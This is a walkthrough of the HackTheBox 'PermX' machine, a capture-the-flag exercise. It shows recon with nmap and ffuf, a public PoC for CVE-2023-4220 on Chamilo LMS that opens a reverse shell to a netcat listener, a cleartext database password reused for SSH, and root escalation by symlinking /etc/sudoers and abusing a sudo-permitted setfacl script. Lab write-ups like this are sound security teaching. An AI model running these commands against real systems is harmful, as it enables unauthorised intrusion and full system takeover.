# PermX Walkthrough
<br/>

## Intro
Welcome to the permX challenge Walkthrough from HackTheBox, here is the link to the [room](https://app.hackthebox.com/machines/permx).
In this room we are gonna have to find a vulenerability in a webservice to get our initial foothold and later do some binary exploitation to capture the root's flag.

To interact with the machine connect via OpenVPN using the "lab" config profile.

Whenever you feel ready press "Join the Machine"

<br/>
<br/>

## The Challenge
As always let's add the IP address to the hosts file:
```bash
sudo -- sh -c "echo 'MACHINE-IP  permx.htb' >> /etc/hosts"
```

We can begin the recon phase with an nmap scan:
```
nmap -sV MACHINE_IP
```

Here is the result
```
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http           Apache httpd 2.4.52
8383/tcp  filtered m2mservices
9091/tcp  filtered xmltec-xmlmail
32785/tcp filtered unknown
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

At this point i tried to do some more enumeration by scanning for subdomains with *fuff* and got a match "lms":
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.permx.htb" -u "http://permx.htb" -fw 18
```

Let's add `lms.permx.htb` to the hosts file as well.

Visiting `http://lms.permx.htb/` we can see a login page powered by Chamilo version 1, we can now look for known vulnerabilities.
After a quick search i have found CVE-2023-4220 which leads to an RCE, i have also seen that there is a PoC on [GitHub](https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS)

```bash
git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc.git
```

Now i have created a virtual environment with python to install the requirements:
```bash
python3 -m venv venv
```
Activate it:
```
source ./venv/bin/activate
```

```bash
pip install requests
```

Now let's prepare a listener on our machine:
```bash
nc -lvnp 1234  
```

Run the exploit to get a reverse shell
```bash
python3 main.py -u http://lms.permx.htb -a revshell
```

And in a couple of seconds we have our shell!

Now we can upgrade the shell to make it interactive and more stable, following this [method]()

Since we are logged in as www-data we need to find a way to get access to the user account "mtz" to retrieve the user flag.
Either running linpeas or by carefully exploring the directories you can find a password in clear text
```
/var/www/chamilo/app/config/configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

Now we can login into the other user via ssh:
```bash
ssh mtz@permx.htb  
```
Insert the password we have just found and we have the session.

Now we can get the first flag:
```bash
cat user.txt
```
--> REDACTED
<br/>

### Privilege Escalation
We can check which binaries we are allowed to run as super user running:
```bash
sudo -l
```

```
User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

Let's find out what this script does:
```bash
cat /opt/acl.sh
```

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

```

The script is calling for another binary "setfacl" which is used to set permissions for files.

A way we can exploit this is to create a custom made file that looks like /etc/sudoers but we will change our user's permissions ad than create a symbolic link between the two

```bash
ln -s /etc/sudoers ./sudoers
```

```bash
sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
```

```bash
nano sudoers
```
edit this line to look like this:
```
mtz ALL=(ALL:ALL) ALL
```

```bash
sudo su
```

And finally we can get the flag:
```bash
cat /root/root.txt
```

<br/>
<br/>

Congratulations, you have completed the challenge! <br>
If you wanna see more write ups you can check the WriteUps Directory in this [GitHub repo](). <br>
Catch you in the next CTF 😃 

